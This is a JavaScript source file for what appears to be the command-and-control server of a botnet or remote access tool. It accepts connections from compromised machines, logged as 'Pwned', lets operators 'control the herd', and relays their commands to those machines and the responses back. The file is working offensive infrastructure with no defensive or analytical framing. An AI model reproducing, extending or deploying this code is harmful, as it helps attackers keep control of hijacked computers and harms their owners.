const { createPacket } = require('../common/packet');
const hosts = require('./hosts');
const controllers = require('./controllers');

class CombinedServer {
    /**
     * @param {string} hostIP
     * @param {number} port
     * @param {string} controlHostIP
     * @param {number} controlPort
     */
    constructor(hostIP, port, controlHostIP, controlPort) {
        this.hostList = new Map();
        this.controllerList = new Map();
        this.nextHostID = 0;
        this.nextControllerID = 0;

        this.hostServer = hosts.createServer(hostIP, port, () => {
            console.log(`Listening for incoming connections at ${hostIP}:${port}`);
        });
        this.hostServer.on('connection', this.handleHostConnection.bind(this));
        this.controlServer = controllers.createServer(controlHostIP, controlPort, () => {
            console.log(`[>] Connect to control server at ${controlHostIP}:${controlPort}`);
        });
        this.controlServer.on('connection', this.handleControllerConnection.bind(this));
    }

    /**
     * @param {hosts.Host} host
     */
    handleHostConnection(host) {
        console.log(`[+] Pwned ${host.ip} ;)`);
        let hostID = this.nextHostID++;
        this.hostList.set(hostID, host);
        host.on('packet', (packet) => {
            let wrappedPkt = createPacket('control', 'response', 'hostresponse');
            wrappedPkt.id = hostID;
            wrappedPkt.data = packet;
            for (let c of this.controllerList.values()) {
                c.sendPacket(wrappedPkt);
            }
        });

        host.on('close', () => {
            console.log(`[-] Host ${host.ip} disconnected`);
            this.hostList.delete(hostID);
        });
        host.on('error', () => {
            console.log(`[!] Host ${host.ip} forcibly exited`);
        });

        let packet = createPacket('control', 'response', 'newpwn');
        packet.id = hostID;
        packet.ip = host.ip;
        for (let c of this.controllerList.values()) {
            c.sendPacket(packet);
        }
    }

    /**
     * @param {controllers.Controller} controller
     */
    handleControllerConnection(controller) {
        console.log(`[+] Now controlling the herd from ${controller.ip}`);
        let controllerID = this.nextControllerID++;
        this.controllerList.set(controllerID, controller);
        for (let [id, host] of this.hostList) {
            let packet = createPacket('control', 'response', 'newpwn');
            packet.id = id;
            packet.ip = host.ip;
            controller.sendPacket(packet);
        }

        controller.on('hostcommand', (hostid, commandPacket) => {
            this.hostList.get(hostid).sendPacket(commandPacket);
        });

        controller.on('close', () => {
            console.log(`[-] Controller ${controller.ip} disconnected`);
            this.controllerList.delete(controllerID);
        });
        controller.on('error', () => {
            console.log(`[!] Controller ${controller.ip} forcibly exited`);
        });
    }
}

exports.CombinedServer = CombinedServer;
